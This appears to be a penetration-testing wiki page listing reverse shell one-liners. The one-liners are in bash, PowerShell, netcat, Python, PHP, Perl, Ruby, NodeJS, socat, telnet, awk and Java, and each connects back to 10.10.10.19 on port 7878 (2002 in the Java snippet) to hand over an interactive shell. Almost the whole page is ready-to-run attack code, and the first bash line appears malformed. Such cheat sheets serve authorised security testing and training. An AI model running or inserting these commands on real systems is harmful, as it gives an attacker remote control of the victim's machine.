# Reverse Shells

### Bash <a id="bash"></a>

```bash
bash -c >& /dev/tcp/10.10.10.19/7878 0>&1
```

### Powershell <a id="powershell"></a>

```scheme
powershell.exe -c "$c = New-Object System.Net.Sockets.TCPClient('10.10.10.19',7878);$str = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $str.Read($b,0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex $d 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sb = ([text.encoding]::ASCII).GetBytes($sendback2);$str.Write($sb,0,$sb.Length);$str.Flush()};$c.Close()"
```

### Netcat <a id="netcat"></a>

#### Linux <a id="linux"></a>

```bash
#Basic
nc -e /bin/sh 10.10.10.19 7878

​#Pipe
nc 10.10.10.19 7878 | /bin/sh

​#Advanced
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.19 7878 >/tmp/f
```

#### Windows <a id="windows"></a>

```scheme
nc.exe -e cmd.exe 10.10.10.19 7878
```

### Python <a id="python"></a>

```bash
#Type 1
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.19",7878));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'​

#Type 2
export RHOST="10.10.10.19";export RPORT=7878;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

### PHP <a id="php"></a>

```bash
#Inside PHP file
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.19/7878 0>&1'"); ?>​

#From command line
php -r '$sock=fsockopen("10.10.10.19",7878);exec("/bin/sh -i <&3 >&3 2>&3");' 
```

### Perl <a id="perl"></a>

```bash
#Type 1
perl -e 'use Socket;$i="10.10.10.19";$p=7878;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'​

#Type 2
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.19:7878");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Ruby <a id="ruby"></a>

```bash
#Type 1
ruby -rsocket -e'f=TCPSocket.open("10.10.10.19",7878).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

​#Type 2
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.19","7878");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### NodeJS <a id="nodejs"></a>

```javascript
require('child_process').exec('nc -e sh 10.10.10.19 7878')
```

### Socat <a id="socat"></a>

```bash
socat TCP:10.10.10.19:7878 EXEC:sh
```

### Telnet <a id="telnet"></a>

```bash
TF=$(mktemp -u);mkfifo $TF && telnet 10.10.10.19 7878 0<$TF | sh 1>$TF
```

### AWK <a id="awk"></a>

```bash
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.19/7878"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Java <a id="java"></a>

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.19/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

[  
](https://wiki.devploit.dev/exploitation/shells/shellcodes)

